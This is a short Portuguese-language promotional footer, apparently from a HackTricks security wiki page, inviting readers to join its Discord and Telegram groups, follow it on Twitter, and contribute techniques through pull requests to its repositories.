- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
